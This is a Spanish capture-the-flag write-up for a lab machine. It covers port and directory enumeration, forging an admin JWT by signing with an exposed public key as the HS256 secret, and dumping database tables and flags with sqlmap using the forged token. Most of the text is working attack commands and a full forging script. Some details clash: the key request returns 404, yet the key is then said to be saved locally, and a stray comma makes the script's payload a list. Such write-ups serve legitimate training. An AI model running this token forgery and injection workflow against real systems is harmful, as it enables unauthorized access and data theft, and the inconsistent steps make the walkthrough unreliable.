# Vaucher

Máquina de nivel avanzado. IP: `192.168.100.164` — Ubuntu corriendo en VirtualBox, atacada desde Kali.

## 1. Reconocimiento

Como primer paso realizamos el reconocimiento de puertos con `nmap`:

```
nmap -p- --open -sCV -Pn -n --min-rate 5000 192.168.100.164
```

![[Pasted image 20261002205857.png]]

La máquina expone los siguientes puertos:

- **22/tcp** → OpenSSH 9.6p1 Ubuntu (3ubuntu13.14), protocol 2.0.
- **80/tcp** → Apache httpd 2.4.58 (Ubuntu), sirviendo la página por defecto *Apache2 Ubuntu Default Page: It works*.
- **8080/tcp** → servidor PHP (PHP cli server 5.5 or later, PHP 8.3.6) con el título **CyberShield Academy — Advanced Cybersecurity Training**. Además anuncia `http-open-proxy: Potentially OPEN proxy` con el método soportado `CONNECTION`.

La MAC `08:00:27:51:AE:55` confirma una interfaz **Oracle VirtualBox virtual NIC** y el `Service Info` apunta a **Linux**.

## 2. Enumeración web

El servicio interesante está en el puerto **8080**, así que fuerceamos rutas con `wfuzz` usando el wordlist de DirBuster:

```
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hh 4345 --follow -t 50 http://192.168.100.164:8080/FUZZ
```

![[Pasted image 20261002230914.png]]

De todas las rutas probadas destacan **assets** (404), **api** (404) y sobre todo **keys**, que es la única que responde con **200**. El directorio `/keys/` es el que nos interesa.

Dentro de él forzamos nombres de ficheros con extensión `.pem`:

```
wfuzz -c \
-w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-u "http://192.168.100.164:8080/keys/FUZZ.pem" \
--sc 200 \
--hh 79 \
-t 20
```

![[Pasted image 20261002231155.png]]

El wordlist devuelve muchos falsos positivos (las líneas de comentario del propio wordlist, todas con 79 caracteres), pero el keyword **public** devuelve un **200** con **9 L / 13 W / 451 Ch**: el fichero es **`public.pem`**.

Comprobamos la URL de la clave en el navegador:

```
http://192.168.100.164:8080/keys/public.pem
```

![[Pasted image 20261002231227.png]]

La petición responde **404 Not Found** desde el navegador, pero acabamos con la clave pública guardada localmente como **`public.pem`** en el directorio de trabajo, lista para usarse como secreto de firmado.

## 3. JWT con clave pública (HS256)

La API valida los tokens JWT con el algoritmo **HS256** y utiliza la clave pública expuesta como secreto de firmado. Como ya disponemos de esa clave, podemos firmar nuestro propio token: creamos el siguiente código en Python para realizar la explotación, que lee `public.pem` y genera un token con el usuario **admin**:

```python
import json, base64, hmac, hashlib
# Functions
def b64url_encode(data):
    s = base64.urlsafe_b64encode(data).rstrip(b"=")
    return s.decode("ascii")

def b64url_encode_json(obj):
    j = json.dumps(obj, separators=(',', ':'), sort_keys=True)
    return b64url_encode(j.encode('utf-8'))

def hmac_sha256(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()

def build_token(header_obj, payload_obj, key_bytes):
    encoded_header = b64url_encode_json(header_obj)
    encoded_payload = b64url_encode_json(payload_obj)
    signing_input = (encoded_header + "." + encoded_payload).encode('ascii')
    sig = hmac_sha256(key_bytes, signing_input)
    encoded_sig = b64url_encode(sig)
    return f"{encoded_header}.{encoded_payload}.{encoded_sig}"


# Open public.pem
with open("public.pem", "rb") as file:
        key_bytes=file.read()

# Create JWT
header = {"alg": "HS256", "typ": "JWT"}

payload = {"username": "admin"},

token= build_token(header,payload, key_bytes)

print("Token--> " + token)
```

Ejecutamos el código explot con el `public.pem`:

![[Pasted image 20261002230613.png]]

El token generado es:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY
```

Lo presentamos en la cabecera `Authorization: Bearer` para consultar el endpoint de cursos y ver si podemos acceder a la base de datos con el token:

```
 curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" "http://192.168.100.164:8080/api/courses.php?q=1"
```

![[Pasted image 20261003003806.png]]

La API acepta el token forjado y devuelve los cursos (**Web App Pentesting**, **Cloud Security 101**) con `"sql_error": null`.

## 4. Explotación con sqlmap

Con el token en la cabecera, lanzamos un primer volcado general contra el endpoint:

```
sqlmap -u "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" --dump --batch
```

A continuación listamos las bases de datos a las que tenemos acceso:

```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" --dbs --batch
```

![[Pasted image 20261003001222.png]]

La inyección está en el parámetro **q** (GET), con las técnicas boolean-based blind, error-based, time-based blind y UNION query de 3 columnas. El backend es **MySQL >= 5.1 (MariaDB fork)** sobre **PHP 8.3.6** y existen dos bases de datos: **`academy_ctf`** e **`information_schema`**.

Listamos las tablas de `academy_ctf`:

```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" -D academy_ctf --tables --batch
```

![[Pasted image 20261003002404.png]]

La base de datos tiene 3 tablas: **`courses`**, **`flags`** y **`users`**.

## 5. Banderas

Enumeramos las columnas de la tabla **`flags`**, que es donde están las banderas:

```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" -D academy_ctf -T flags --columns --no-cast --batch
```

![[Pasted image 20261003002841.png]]

La tabla tiene 3 columnas: **`name`** (varchar(50)), **`flag_value`** (varchar(255)) e **`id`** (int(11)). Volcamos `name` y `flag_value`:

```
sqlmap --url "http://192.168.100.164:8080/api/courses.php?q=1" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.W3sidXNlcm5hbWUiOiJhZG1pbiJ9XQ.p5xuSYdRW7kENc1nzySrtNorfnIAzOnEA5WgixfYHOY" -D academy_ctf -T flags -C name,flag_value  --dump --no-cast --batch
```

![[Pasted image 20261003003323.png]]

Y encontramos las dos banderas de la máquina:

- **PRELIM** → `c5c990058b42fd0b07c237a2a8035ac7`
- **FINAL** → `8c694f3b9d100de3d2ee51b76db4f3cb`
